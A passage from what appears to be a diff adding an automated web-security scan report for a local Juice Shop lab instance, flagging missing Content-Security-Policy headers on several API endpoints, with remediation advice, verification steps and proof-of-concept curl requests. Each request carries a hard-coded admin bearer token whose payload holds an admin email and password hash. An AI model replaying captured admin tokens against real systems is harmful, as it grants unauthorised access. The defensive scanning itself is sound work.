+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/api/Recycles/ \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/admin/application-configuration<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/admin/application-configuration \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/basket/{id}<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/basket/1 \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/continue-code<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/continue-code \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/order-history<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
+  http://localhost:3000/rest/order-history \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;
+```</td></tr>
+<tr><td><span class="badge">Medium</span></td><td>headers</td><td>Security Header Issue (Missing Csp) — http://localhost:3000/rest/products/search<br><small>high confidence</small></td><td>Missing Content-Security-Policy header.<br><code>curl \
+  &#x27;http://localhost:3000/rest/products/search?q=&#x27; \
+  -H &#x27;Host: localhost:3000&#x27; \
+  -H &#x27;Accept: application/json, text/plain, */*&#x27; \
+  -H &#x27;Referer: http://localhost:3000/&#x27; \
+  -H &#x27;Priority: u=0&#x27; \
+  -H &#x27;Connection: keep-alive&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:150.0) Gecko/20100101 Firefox/150.0&#x27; \
+  -H &#x27;Sec-Fetch-Dest: empty&#x27; \
+  -H &#x27;Sec-Fetch-Mode: cors&#x27; \
+  -H &#x27;Sec-Fetch-Site: same-origin&#x27; \
+  -H &#x27;Accept-Encoding: gzip, deflate, br, zstd&#x27; \
+  -H &#x27;Accept-Language: en-US,en;q=0.9&#x27; \
+  -H &#x27;Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDUtMjMgMDM6MjE6MTguNDUyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3OTU0MDc3MX0.UmP_0aIYFA7tjh5EOF5bMsb6r2704LKPz65d5DLK-rdbFyPXrX1uVywFde_e67G5tdo9_MII5oz0ZMg1NOaNvb5yu-tusXM0zKY6nYFz__i_FuXQ48J3x4mDRs9k0fB1N12EyEywnHAftGTH7ygiJChXQQlw7yNQd6WuEmJFXRQ&#x27; \
+  -H &#x27;Cookie: language=en&#x27;</code></td><td class="remediation">Set modern browser security headers at the edge or application layer. Deploy a restrictive CSP, HSTS for HTTPS origins, X-Content-Type-Options: nosniff, clickjacking protection, Referrer-Policy, Permissions-Policy, and hardened cookie flags.</td><td class="playbook">## MANUAL VERIFICATION
+
+1. Send the baseline request.
+2. Inspect response headers and Set-Cookie values.
+3. Confirm the missing, unsafe, or misconfigured header is reproducible.
+4. Verify whether the endpoint is an API, HTML page, or static asset to set priority.
+
+## IF AMBIGUOUS
+
+- Check whether a CDN or reverse proxy adds headers in production only.
+- For CORS, confirm credentials are actually allowed by browsers.
+- For cookies, confirm flags on every Set-Cookie response, not only this endpoint.
+
+## CLEANUP
+
+No cleanup required.
+
+## POC CURL
+
+```bash
+curl \
